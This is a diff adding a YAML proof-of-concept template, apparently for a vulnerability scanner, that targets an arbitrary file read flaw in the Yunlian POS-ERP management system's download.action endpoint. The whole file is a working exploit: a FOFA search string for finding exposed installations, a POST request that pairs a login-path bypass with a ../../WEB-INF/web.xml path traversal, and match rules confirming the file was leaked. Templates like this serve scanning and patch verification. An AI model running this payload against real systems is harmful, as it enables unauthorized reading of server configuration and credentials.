@@ -1,0 +1,18 @@
+id: poc-yaml-yunlian-pos-erp-download-action-anyfile-read
+info:
+  name: 云连POS-ERP管理系统 download.action 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 云连POS-ERP管理系统
+  fofa: title="Powered By chaosZ"
+requests:
+- method: POST
+  path: /admin/file!download.action;admin!login.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: downloadFile=../../WEB-INF/web.xml
+  expression: status_code == 200 && contains(body,"</web-app>") && contains(body,"<display-name>")
+    && contains(headers,"filename=../../WEB-INF/web.xml") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
